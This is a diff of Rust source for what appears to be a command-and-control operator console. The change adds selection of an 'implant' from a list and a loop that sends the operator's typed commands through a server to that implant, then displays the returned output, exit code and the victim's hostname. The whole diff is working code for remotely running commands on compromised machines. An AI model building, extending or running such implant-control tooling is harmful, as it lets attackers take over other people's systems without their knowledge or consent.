@@ -4,7 +4,7 @@ use std::{
     net::TcpStream,
 };
 
-use common::{Packet, encode, read_packet};
+use common::{Implant, Packet, encode, read_packet};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let passwd = rpassword::prompt_password("Input password: ")?;
@@ -66,9 +66,16 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         stdout().flush().unwrap();
         let mut input = String::new();
         stdin().read_line(&mut input).unwrap();
+        let input = input.trim();
 
         if input == "exit" {
             break;
+        }
+
+        if let Ok(index) = input.parse::<usize>()
+            && let Some(implant) = implants.get(index - 1)
+        {
+            enter_command_loop(implant);
         }
     }
 
@@ -78,4 +85,56 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 fn connect() -> TcpStream {
     let address = env::var_os("TYSE_ADDRESS").unwrap();
     TcpStream::connect(address.into_string().unwrap()).unwrap()
+}
+
+fn enter_command_loop(implant: &Implant) {
+    let mut last_exit_code = None;
+    let mut last_output = None;
+    loop {
+        if let Some(output) = last_output {
+            println!("{}", output);
+        }
+
+        print!(
+            "{}{}> ",
+            implant.system_info.hostname,
+            if let Some(exit_code) = last_exit_code {
+                format!(": {exit_code}")
+            } else {
+                "".to_string()
+            }
+        );
+        stdout().flush().unwrap();
+        last_output = None;
+        last_exit_code = None;
+
+        let mut input = String::new();
+        stdin().read_line(&mut input).unwrap();
+        let input = input.trim();
+
+        if input == "exit" {
+            return;
+        }
+
+        let mut connection = connect();
+        connection
+            .write(
+                encode(Packet::CommandPacket {
+                    command: input.to_string(),
+                })
+                .unwrap()
+                .as_slice(),
+            )
+            .unwrap();
+
+        let packet = read_packet(&mut connection).unwrap();
+
+        match packet {
+            Packet::CommandResult { output, exit_code } => {
+                last_exit_code = Some(exit_code);
+                last_output = Some(output);
+            }
+            _ => {}
+        }
+    }
 }
